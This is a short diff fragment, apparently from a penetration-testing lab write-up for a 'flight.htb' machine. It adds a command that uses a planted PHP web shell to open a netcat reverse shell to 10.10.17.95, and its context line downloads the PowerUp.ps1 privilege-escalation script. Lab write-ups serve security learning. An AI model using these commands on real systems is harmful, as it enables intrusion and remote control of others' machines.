@@ -57,7 +57,7 @@ powershell wget http://10.10.17.95/PowerUp.ps1 -OutFile C:\Users\C.Bum\Desktop\P
 ```
 
 ```
-
+curl school.flight.htb/styles/shell.php?cmd=nc64.exe -e cmd.exe 10.10.17.95 53
 ```
 
 ```
